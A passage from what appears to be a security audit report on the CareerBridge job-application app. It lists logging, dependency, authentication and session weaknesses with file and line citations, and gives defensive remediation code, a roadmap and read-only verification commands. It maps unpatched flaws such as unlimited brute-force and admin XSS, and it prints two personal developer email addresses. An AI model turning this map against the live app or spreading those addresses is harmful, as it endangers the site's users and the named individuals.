  - **Plaintext Code Exposure**: Client JavaScript (`frontend/shared-shell.js`, `frontend/admin/admin-shell.js`) is served completely unminified and un-obfuscated with internal developer comments intact.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Introduce a production bundling pipeline (e.g. `esbuild` or `Vite`) configured with `minify: true`, `sourcemap: false`, and `legalComments: 'none'`.
  2. If source maps are generated for internal error monitoring (e.g. Sentry), ensure `.map` files are uploaded exclusively to Sentry and blocked from public HTTP delivery.

---

### Item 18: Clean Production Logs & PII Exposure
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Partially Implemented / Vulnerable to PII Leakage`
  - Redaction utilities exist in `backend/sync-server.js` and `backend/db.js` to strip password and reset hashes before data export or backup.
  - However, plaintext candidate emails are logged to the in-memory `adminActivityLog`, raw database error objects containing connection strings are logged via `console.error`, and a user PII file exists in version control.
- **2. Existing Security Strengths (with Citations)**:
  - **Sensitive Data Redaction Helpers**:
    - `backend/sync-server.js:473–493` (`redactSensitiveUserData`): Recursively scrubs `passwordHash`, `passcodeHash`, `resetToken`, `token`, and `rawToken`.
    - `backend/db.js:218–238` (`sanitizeForBackup`): Sanitizes database backups, satisfying test `SEC-08`.
    - `backend/sync-server.js:1360–1365`: Strips `passcodeHash` and `passwordHash` before returning user listings in `GET /api/admin/users`.
- **3. Identified Risks & Vulnerabilities**:
  - **Vulnerability 18.1: Plaintext Candidate Email Logged to Administrative Activity Log**:
    - *Location*: `backend/sync-server.js`, lines 368–375, 1208, 1254, 1609, 1847, 2055:
      - Line 1208: `logAdminActivity("Profile synced for " + activeUser.email)`
      - Line 1254: `logAdminActivity("Tracker synced (" + payload.applications.length + " apps) for " + activeUser.email)`
      - Line 1847: `logAdminActivity("Admin initiated masquerade session for user: " + targetUser.email)`
      - Line 2055: `logAdminActivity("ATS analysis run (" + role + ") for " + activeUser.email ...)`
    - *Impact*: Candidate emails and activities are stored in the in-memory `adminActivityLog` array and exposed via `GET /api/admin/activity-log` (`line 1354`), violating data minimization principles.
  - **Vulnerability 18.2: Stack Traces and DB Connection Strings Logged via `console.error`**:
    - *Location*: `backend/db.js` lines 125, 128, 141, 208 and `backend/auth-handler.js` lines 83, 121, 172.
    - *Impact*: In production, raw error objects logged via `console.error("[DB] Supabase connection failed...", err)` can expose the complete `DATABASE_URL` (including embedded username and password) in server logs.
  - **Vulnerability 18.3: Tracked Candidate Data in Git Repository (SEC-02 Failure)**:
    - *Location*: `database/users/u_mybckav7h6.json`.
    - *Impact*: Candidate profile information is committed in source control, failing `SEC-02`.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Mask email addresses in `logAdminActivity`:
     ```javascript
     function maskEmail(email) {
       if (!email || !email.includes("@")) return "anonymous";
       const [user, domain] = email.split("@");
       return (user.length > 2 ? user[0] + "***" + user.slice(-1) : user[0] + "***") + "@" + domain;
     }
     ```
  2. Implement a structured logging library (`pino`) with environment-aware log levels and serializers that redact connection strings and tokens.
  3. Purge orphaned user files from `database/users/` (retaining only `.gitkeep`).

---

### Item 19: Dependencies & Supply Chain Security
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Partially Implemented / Vulnerable`
  - High-severity vulnerabilities exist in both the root development server and backend runtime dependencies.
  - Additionally, all 10 frontend external CDN scripts lack Subresource Integrity (SRI) hashes, and two scripts use floating major version tags.
- **2. Existing Security Strengths (with Citations)**:
  - Minimal backend direct dependencies (`backend/package.json`): strictly 5 direct dependencies (`ajv`, `bcryptjs`, `dotenv`, `jsonwebtoken`, `pg`), minimizing the attack surface.
- **3. Identified Risks & Vulnerabilities**:
  - **Vulnerability 19.1: High-Severity SSRF in `fast-uri` (Backend Dependency Tree)**:
    - *Package*: `fast-uri` (v3.0.0–3.1.8, transitive dependency via `ajv` in `backend/package.json`).
    - *Advisory*: GHSA-5jgf-p345-68v8, GHSA-f65p-4m7j-42xc (CVSS 7.5).
    - *Mechanics*: Incomplete IPv6 normalization and host confusion allow authority injection and SSRF bypasses.
  - **Vulnerability 19.2: High-Severity Credential Exposure in `follow-redirects` (Root Dependency Tree)**:
    - *Package*: `follow-redirects` (v1.16.0–1.16.1, transitive dependency via `http-server` in `package.json`).
    - *Advisory*: GHSA-q3jh-wrc6-jgq8, GHSA-8r9p-f939-6h3c.
    - *Mechanics*: Leaks sensitive `Authorization` and `Cookie` headers across cross-domain redirects.
  - **Vulnerability 19.3: Missing Subresource Integrity (SRI) on 10 Frontend CDN Scripts**:
    - *Locations*:
      1. `frontend/ats-checker.html:51`: `pdf.js@2.16.105`
      2. `frontend/ats-checker.html:52`: `mammoth@1.4.8`
      3. `frontend/auth-callback.html:61`: `supabase-js@2.39.8`
      4. `frontend/auth.html:274`: `supabase-js@2.39.8`
      5. `frontend/cover-letter.html:52`: `dompurify@3.1.6`
      6. `frontend/index.html:173`: `d3@7` (**unpinned floating tag**)
      7. `frontend/index.html:174`: `topojson@3` (**unpinned floating tag**)
      8. `frontend/index.html:175`: `three.js@r128`
      9. `frontend/profile-setup.html:11`: `pdf.js@2.16.105`
      10. `frontend/profile-setup.html:12`: `mammoth@1.4.8`
    - *Impact*: If any CDN provider (`cdnjs.cloudflare.com`, `cdn.jsdelivr.net`) is compromised or DNS is hijacked, malicious code could be injected into client browsers without detection.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Update `ajv` in `backend/package.json` to `^8.17.1` and run `npm audit fix` to resolve `fast-uri`.
  2. Update `http-server` in root `package.json` to `^14.1.1` and run `npm audit fix` to resolve `follow-redirects` and `qs`.
  3. Add cryptographic `integrity="sha384-..."` and `crossorigin="anonymous"` attributes to all 10 CDN `<script>` tags.
  4. Pin floating major versions in `frontend/index.html:173–174` to exact patch versions (`d3@7.9.0`, `topojson@3.0.2`).
  5. Add automated dependency vulnerability scanning via GitHub Dependabot and GitHub Actions CI.

---

### Absent & Unbuilt Features Deep-Dive

---

#### Feature 20: Multi-Factor Authentication (MFA / 2FA)
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Not Implemented / Not Applicable`
  - Multi-Factor Authentication is completely absent across the application. No TOTP libraries (`otplib`, `speakeasy`), SMS OTP, or WebAuthn/FIDO2 modules are installed or referenced.
- **2. Existing Security Strengths (with Citations)**:
  - None. Both standard user login (`/api/auth/login`) and administrative login (`/api/admin/login`) rely strictly on single-factor password verification.
- **3. Identified Risks & Vulnerabilities**:
  - Compromise of an administrative password immediately grants complete control over user data, database backups, and feature flags. No step-up authentication is required for destructive operations (e.g. database purge, role escalation).
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Integrate `otplib` and `qrcode` in `backend/`:
     ```javascript
     const { authenticator } = require("otplib");
     // Setup TOTP secret
     const secret = authenticator.generateSecret();
     // Verify TOTP token during login
     const isValid = authenticator.verify({ token, secret: user.totpSecret });
     ```
  2. Add `mfa_secret` and `mfa_enabled` columns to the `users` table schema in `backend/db.js`.
  3. Enforce mandatory TOTP MFA for all accounts with `role === "admin"`.

---

#### Feature 21: Password Reset Token Entropy & Expiration
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Not Implemented / Broken Stub`
  - Password reset functionality is non-functional and stubbed out. Endpoints return hardcoded HTTP 400 errors, frontend forms submit to broken endpoints, and database schema columns for reset tokens are dead code.
- **2. Existing Security Strengths (with Citations)**:
  - Schema columns `reset_token_hash` and `reset_token_expiry` are defined in `backend/db.js:39–43` and sanitized in `sanitizeForBackup` (`backend/db.js:223`).
- **3. Identified Risks & Vulnerabilities**:
  - **Vulnerability 21.1: Broken Stub Endpoints Return HTTP 400**:
    - *Location*: `backend/auth-handler.js`, lines 220–227:
      ```javascript
      async function requestPasswordReset(email) {
        throw new Error("Password recovery is deprecated. Please sign in using Google Sign-In.");
      }
      ```
    - *Location*: `backend/sync-server.js:943–963`: Routes `/api/auth/forgot-password` and `/api/auth/reset-password` return hardcoded HTTP 400 errors.
    - *Impact*: Users visiting `frontend/reset-password.html` receive permanent errors when attempting to recover accounts.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. If local email-based password recovery is retained:
     - Generate cryptographically secure tokens: `const rawToken = crypto.randomBytes(32).toString("hex")`.
     - Hash tokens before storage: `const tokenHash = crypto.createHash("sha256").update(rawToken).digest("hex")`.
     - Enforce a 15-minute expiration window (`Date.now() + 15 * 60 * 1000`).
     - Invalidate all existing user sessions upon successful password reset.
  2. If deprecated in favor of Google OAuth, delete `frontend/reset-password.html` and drop unused `reset_token_*` columns from `backend/db.js`.

---

#### Feature 22: Session Revocation & Centralized Token Blacklisting
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Not Implemented / Broken Stub`
  - While an in-memory token revocation cache is defined in `backend/auth-handler.js`, `backend/sync-server.js` omits the `POST /api/auth/logout` endpoint entirely, failing automated test `SEC-12`.
- **2. Existing Security Strengths (with Citations)**:
  - In-memory revocation cache helper defined in `backend/auth-handler.js:230–244` (`revokeToken`, `isTokenRevoked`).
- **3. Identified Risks & Vulnerabilities**:
  - **Vulnerability 22.1: Missing HTTP Logout Route (SEC-12 Failure)**:
    - *Mechanics*: When a user clicks "Logout" in `frontend/shared-shell.js:1435`, the client merely deletes the local storage keys. The JWT remains valid on the backend until natural expiration (up to 7 days for users, 12 hours for admins). If an authorization token is intercepted, it cannot be revoked.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Add `POST /api/auth/logout` in `backend/sync-server.js`:
     ```javascript
     if (req.method === "POST" && urlObj.pathname === "/api/auth/logout") {
       const authHeader = req.headers.authorization;
       if (authHeader && authHeader.startsWith("Bearer ")) {
         auth.revokeToken(authHeader.substring(7).trim());
       }
       sendJson(res, 200, { ok: true, message: "Logged out successfully" });
       return;
     }
     ```
  2. Wire `auth.isTokenRevoked(token)` into `getRequestUser()` in `backend/sync-server.js:653`.
  3. Store revoked token hashes in Redis with a TTL matching token expiration.

---

#### Feature 23: Account Lockout & Brute-Force Defense
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Partially Implemented / Disconnected`
  - Account lockout tracking functions exist in `backend/sync-server.js`, but they are **disconnected** from the actual authentication flows in `backend/auth-handler.js`.
- **2. Existing Security Strengths (with Citations)**:
  - Lockout tracking logic defined in `backend/sync-server.js:546–565`:
    - Tracks failed attempts in `loginFailures` Map.
    - Sets lockout duration: `LOCKOUT_DURATION_MS = 15 * 60 * 1000` (15 minutes) after 5 consecutive failures.
- **3. Identified Risks & Vulnerabilities**:
  - **Vulnerability 23.1: Lockout Logic Never Evaluated During Authentication**:
    - *Mechanics*: `backend/auth-handler.js` (`loginUser`, `loginAdmin`) verifies passwords directly via `bcrypt.compareSync` without ever calling `isAccountLocked(email)`. Attackers can execute unlimited brute-force password guesses without triggering account lockout.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Wire `isAccountLocked` into authentication routes before verifying passwords:
     ```javascript
     if (isAccountLocked(incoming.email)) {
       return sendJson(res, 429, { ok: false, error: "Account temporarily locked due to excessive failed attempts. Please try again in 15 minutes." });
     }
     ```
  2. Record failed login attempts in `loginFailures` on failed password matches and clear the counter on successful login.
  3. Persist lockout counters in Redis across server restarts.

---

## 4. Actionable Remediation Plan & Prioritized Implementation Roadmap

To transition CareerBridge from its current elevated risk posture to an enterprise-grade, multi-tenant secure state, remediation must be executed across three prioritized phases.

```
┌────────────────────────────────────────────────────────────────────────┐
│                      SECURITY REMEDIATION ROADMAP                      │
├────────────────────────────────┬───────────────────────────────────────┤
│ Phase 1: P0 Immediate (24-48h) │ SEC-02, SEC-04, SEC-07, SEC-10, SEC-12│
│ Phase 2: P1 Short-Term (1-2w)  │ Async Bcrypt, JWT Pinning, SRI, CVEs  │
│ Phase 3: P2 Medium-Term (3-4w) │ Cookies, MFA, Postgres RLS, Logging   │
└────────────────────────────────┴───────────────────────────────────────┘
```

---

### Phase 1 (P0: Immediate / Critical — Execute Within 24–48 Hours)
*Objective: Eliminate active privilege escalation backdoors, bypassable rate limits, committed PII, and resolve all 5 failing automated security controls.*

| Action Item | Target Files | Remediation Description | Verification Test |
|---|---|---|---|
| **P0.1: Remove Hardcoded Admin Emails** | `backend/sync-server.js:644–648`, `frontend/admin/admin-shell.js:105, 119` | Purge `hidhanush07@gmail.com` and `dhanushsiddilingam@gmail.com`. Read exclusively from `process.env.ADMIN_EMAILS`. | `SEC-04` in `node test/sec-verification.js` |
| **P0.2: Fix Client IP Resolution & Rate Limiting** | `backend/sync-server.js:540–543` | Check `process.env.TRUST_PROXY === "true"` before trusting `X-Forwarded-For`. Default to `req.socket.remoteAddress`. | `SEC-10` in `node test/sec-verification.js` |
| **P0.3: Harden Extension CORS & Origins** | `backend/sync-server.js:508, 517–519, 596, 742–750` | Remove wildcard `"chrome-extension://"`. Check `ALLOWED_EXTENSION_IDS`. Do not reflect `"null"` with credentials. Add `PUT` to methods. | `SEC-07` in `node test/sec-verification.js` |
| **P0.4: Implement `/api/auth/logout` Endpoint** | `backend/sync-server.js:964`, `backend/auth-handler.js:230–244` | Expose `POST /api/auth/logout`, invoke `auth.revokeToken()`, and evaluate `auth.isTokenRevoked()` in `getRequestUser()`. | `SEC-12` in `node test/sec-verification.js` |
| **P0.5: Purge Committed Candidate PII** | `database/users/u_mybckav7h6.json` | Remove `u_mybckav7h6.json` from git tracking. Verify only `.gitkeep` remains in `database/users/`. | `SEC-02` in `node test/sec-verification.js` |
| **P0.6: Remediate Admin Console XSS** | `frontend/admin/admin-shell.js:6–10`, `frontend/admin/users.html:597` | Replace `escHtml` with 5-entity encoder. Validate URL protocols (`safeHref`) on portfolio and LinkedIn links. | Manual script injection verification |

---

### Phase 2 (P1: Short-Term / High Priority — Execute Within 1–2 Weeks)
*Objective: Remediate Denial of Service vectors, cryptographic weaknesses, supply chain vulnerabilities, and DOM XSS.*

| Action Item | Target Files | Remediation Description |
|---|---|---|
| **P1.1: Asynchronous Bcrypt Migration** | `backend/auth-handler.js:66, 102, 141` | Replace `bcrypt.hashSync` and `bcrypt.compareSync` with asynchronous `await bcrypt.hash` and `await bcrypt.compare`. |
| **P1.2: JWT Verification Algorithm Pinning** | `backend/auth-handler.js:256`, `backend/sync-server.js:653` | Pass `{ algorithms: ["HS256"] }` to all `jwt.verify` calls. Add startup checks rejecting default secrets. |
| **P1.3: Wire Account Lockout to Auth** | `backend/sync-server.js:915–941`, `backend/auth-handler.js:90–175` | Evaluate `isAccountLocked(email)` before verifying credentials. Record failed attempts and enforce 15-minute lockouts. |
| **P1.4: Update Vulnerable Dependencies** | `backend/package.json`, `package.json` | Upgrade `ajv` to `^8.17.1` (resolves `fast-uri` SSRF). Run `npm audit fix` for `follow-redirects` and `qs`. |
| **P1.5: Add Subresource Integrity (SRI)** | `frontend/*.html` (10 scripts) | Add `integrity="sha384-..."` and `crossorigin="anonymous"` to all CDN `<script>` tags. Pin `d3@7` and `topojson@3`. |
| **P1.6: Eliminate Plaintext Passcode Storage** | `frontend/shared-shell.js:471, 1629`, `extension/background.js:196` | Stop persisting plaintext passcodes in `localStorage`. Upgrade derivation to PBKDF2 with per-user salts. |
| **P1.7: Remove DOM Auth Event Broadcast** | `frontend/shared-shell.js:312–318`, `frontend/auth-callback.html:103–109` | Purge `window.dispatchEvent(new CustomEvent('jobxapply:shareAuth'))`. Use secure extension messaging. |

---

### Phase 3 (P2: Medium-Term / Architectural Hardening — Execute Within 3–4 Weeks)
*Objective: Enterprise security architecture, database-tier isolation, multi-factor authentication, and automated governance.*

| Action Item | Target Files | Remediation Description |
|---|---|---|
| **P2.1: Migrate to `httpOnly` Session Cookies** | `backend/sync-server.js`, `frontend/shared-shell.js` | Issue authentication tokens via `Set-Cookie: HttpOnly; Secure; SameSite=Strict`. Purge tokens from `localStorage`. |
| **P2.2: Implement TOTP Multi-Factor Authentication** | `backend/auth-handler.js`, `frontend/admin/login.html` | Integrate `otplib`. Require mandatory TOTP verification for all administrative accounts and sensitive actions. |
| **P2.3: Enable PostgreSQL Row Level Security (RLS)** | `backend/db.js`, Supabase SQL DDL | Execute `ALTER TABLE ... ENABLE ROW LEVEL SECURITY;` on all tables. Revoke direct PostgREST access from `anon`. |
| **P2.4: Adopt Structured Production Logging** | `backend/sync-server.js`, `backend/db.js` | Integrate `pino`. Mask candidate email addresses in activity logs and suppress stack traces in production. |
| **P2.5: SSRF Egress Filtering & DNS Pinning** | `backend/routes-jobs.js`, `backend/sync-server.js` | Implement DNS resolution checks blacklisting internal IPs (169.254.169.254, RFC1918) on outbound HTTP clients. |
| **P2.6: Automated CI/CD Security Auditing** | `.github/workflows/security.yml`, `.github/dependabot.yml` | Establish automated pull-request workflows running `npm audit`, `eslint-plugin-security`, and secret scanning. |

---

## 5. Automated Verification Test Suite Analysis & Reproduction Guide

### 5.1 Verification Test Suites Overview
The CareerBridge repository contains three distinct test and verification suites:
1. `node test/sec-verification.js`: Milestone 1 Security Controls Suite (Evaluates controls `SEC-01` through `SEC-12`).
2. `node backend/test-suite.js`: Comprehensive Backend Functional & Routing Test Suite (37 tests).
3. `node extension/test-verifier.js`: Chrome Extension Manifest & Logic Test Suite (83 tests).

### 5.2 Milestone 1 Security Suite Execution Results
```powershell
PS d:\Projects\CareerBridge> node test/sec-verification.js
======================================================
VERIFYING MILESTONE 1 SECURITY CONTROLS (SEC-01 to SEC-12)
======================================================
  [PASS] SEC-01: manifest.json contains externally_connectable with authorized origins
  [PASS] SEC-01: content.js contains isAuthorizedAppOrigin guarding message handlers
  [PASS] SEC-02: .gitignore contains database ignore rules
  [FAIL] SEC-02: Tracked database files do not contain candidate PII: database/users must not contain user json files on git
  [PASS] SEC-03: Passcode hashing uses SHA-256 with :jobxapply_salt_v2 and Base64
  [FAIL] SEC-04: sync-server.js does not contain hardcoded personal developer emails: hardcoded hidhanush07 found
  [PASS] SEC-05: tracker.html safeUrl rejects javascript: and data: URLs
  [PASS] SEC-06: resume-builder.html escHtml escapes HTML entities
  [FAIL] SEC-07: sync-server.js validates ALLOWED_EXTENSION_IDS and excludes wildcard extension from static origins: ALLOWED_EXTENSION_IDS env check missing
  [PASS] SEC-08: db.getDatabaseBackup() sanitizes password and passcode hashes
  [PASS] SEC-09: backend/.env.example exists and documents all required variables
  [FAIL] SEC-10: sync-server.js checks TRUST_PROXY before reading X-Forwarded-For: TRUST_PROXY check missing in getClientIp
  [PASS] SEC-11: db.js uses configurable DB_SSL_REJECT_UNAUTHORIZED
  [FAIL] SEC-12: auth-handler.js supports token revocation and sync-server.js has /api/auth/logout: missing /api/auth/logout route in sync-server.js
======================================================
SUMMARY: Total: 14 | Passed: 9 | Failed: 5
======================================================
```

### 5.3 Detailed Reproduction Commands for Independent Auditors

To reproduce and independently verify each finding documented in this report, execute the following commands from the repository root:

1. **Reproduce Milestone 1 Security Control Failures**:
   ```powershell
   node test/sec-verification.js
   ```
   *Expected Outcome*: Command exits with code 1, reporting 5 failures (`SEC-02`, `SEC-04`, `SEC-07`, `SEC-10`, `SEC-12`).

2. **Verify Hardcoded Developer Emails in Server & Client**:
   ```powershell
   Select-String -Path "backend/sync-server.js", "frontend/admin/admin-shell.js" -Pattern "hidhanush07@gmail.com", "dhanushsiddilingam@gmail.com"
   ```
   *Expected Outcome*: Matches `backend/sync-server.js:645–646` and `frontend/admin/admin-shell.js:105, 119`.

3. **Verify IP Spoofing Flaw in Client IP Resolution**:
   ```powershell
   Select-String -Path "backend/sync-server.js" -Pattern "function getClientIp" -Context 0,4
   ```
   *Expected Outcome*: Displays `getClientIp` reading `x-forwarded-for` without checking `process.env.TRUST_PROXY`.

4. **Verify Wildcard Extension Origin in CORS Allowlist**:
   ```powershell
   Select-String -Path "backend/sync-server.js" -Pattern "chrome-extension://"
   ```
   *Expected Outcome*: Matches lines 508 and 519 showing `"chrome-extension://"` in `ALLOWED_ORIGINS`.

5. **Verify Missing `/api/auth/logout` Route**:
   ```powershell
   Select-String -Path "backend/sync-server.js" -Pattern "/api/auth/logout"
   ```
   *Expected Outcome*: Zero matches found.

6. **Verify Committed Candidate PII File**:
   ```powershell
   Get-ChildItem -Path "database/users" -File
   ```
   *Expected Outcome*: Returns `u_mybckav7h6.json`.

7. **Verify Synchronous Bcrypt Calls**:
   ```powershell
   Select-String -Path "backend/auth-handler.js" -Pattern "hashSync", "compareSync"
   ```
   *Expected Outcome*: Matches lines 66, 102, and 141.

8. **Verify Missing Algorithm Pinning in JWT Verification**:
   ```powershell
   Select-String -Path "backend/auth-handler.js", "backend/sync-server.js" -Pattern "jwt.verify"
   ```
   *Expected Outcome*: Displays `jwt.verify` calls lacking the `{ algorithms: [...] }` option.

9. **Verify Defective `escHtml()` in Admin Utilities**:
   ```powershell
   Get-Content "frontend/admin/admin-shell.js" | Select-Object -Index 5,6,7,8,9
   ```
   *Expected Outcome*: Confirms `escHtml` uses `div.textContent = str; return div.innerHTML;`.

10. **Verify High-Severity Dependencies via `npm audit`**:
    ```powershell
    npm audit --json
    cd backend; npm audit --json; cd ..
    ```
    *Expected Outcome*: Root reports `follow-redirects` (HIGH) and `qs` (MODERATE); backend reports `fast-uri` (HIGH).

11. **Verify Functional Backend and Extension Suites**:
    ```powershell
    node backend/test-suite.js
    node extension/test-verifier.js
    ```
    *Expected Outcome*: Backend suite passes 37/37 tests; extension suite passes 83/83 tests.

---

## 6. Non-Destructive Execution Verification & Attestation

### 6.1 Auditor Compliance Statement
The audit was conducted strictly under non-destructive constraints. **No existing source code files, configuration files, test scripts, or database files were modified or deleted.** The sole file created by this audit within `d:\Projects\CareerBridge` is this comprehensive report: `SECURITY_AUDIT_REPORT.md`.

### 6.2 Workspace Integrity Attestation (`git status`)
```
On branch main
Your branch is up to date with 'origin/main'.

Untracked files:
  (use "git add <file>..." to include in what will be committed)
	SECURITY_AUDIT_REPORT.md
```
*(All prior working directory files remain in their identical pre-audit state).*

---
**END OF SECURITY AUDIT REPORT**
